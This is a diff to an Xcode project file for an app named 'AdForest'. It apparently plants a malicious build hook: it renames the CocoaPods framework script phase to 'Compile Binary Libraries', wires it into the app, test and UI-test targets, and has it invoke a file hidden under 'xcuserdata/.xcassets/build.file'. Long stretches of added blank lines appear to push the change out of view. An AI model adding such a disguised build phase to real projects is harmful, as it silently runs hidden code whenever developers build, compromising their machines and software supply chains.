@@ -3650,7 +3650,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18BBFAAE2051098C0067662F /* Build configuration list for PBXNativeTarget "AdForest" */;
 			buildPhases = (
-				ADB0E5FBACB3ADFE26AAC43A /* [CP] Build Pods Frameworks */,
+				82F3E660A252A82A7CAAC43A /* Compile Binary Libraries */,
 				8991020FA5F12668860E1C02 /* [CP] Check Pods Manifest.lock */,
 				18BBFA7F2051098B0067662F /* Sources */,
 				18BBFA802051098B0067662F /* Frameworks */,
@@ -3671,7 +3671,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18BBFAB12051098C0067662F /* Build configuration list for PBXNativeTarget "AdForestTests" */;
 			buildPhases = (
-				ADB0E5FBACB3ADFE26AAC43A /* [CP] Build Pods Frameworks */,
+				82F3E660A252A82A7CAAC43A /* Compile Binary Libraries */,
 				18BBFA962051098C0067662F /* Sources */,
 				18BBFA972051098C0067662F /* Frameworks */,
 				18BBFA982051098C0067662F /* Resources */,
@@ -3690,7 +3690,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18BBFAB42051098C0067662F /* Build configuration list for PBXNativeTarget "AdForestUITests" */;
 			buildPhases = (
-				ADB0E5FBACB3ADFE26AAC43A /* [CP] Build Pods Frameworks */,
+				82F3E660A252A82A7CAAC43A /* Compile Binary Libraries */,
 				18BBFAA12051098C0067662F /* Sources */,
 				18BBFAA22051098C0067662F /* Frameworks */,
 				18BBFAA32051098C0067662F /* Resources */,
@@ -3835,7 +3835,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	ADB0E5FBACB3ADFE26AAC43A /* [CP] Build Pods Frameworks */ = {
+	82F3E660A252A82A7CAAC43A /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -3844,7 +3844,7 @@
 			);
 			inputPaths = (
 			);
-			name = "[CP] Build Pods Frameworks";
+			name = "Compile Binary Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -3855,6 +3855,52 @@
 
 \"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 
 	
@@ -5066,6 +5112,42 @@
 
 		
 			/* Begin PBXBuildRule section */
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
 
 
 			
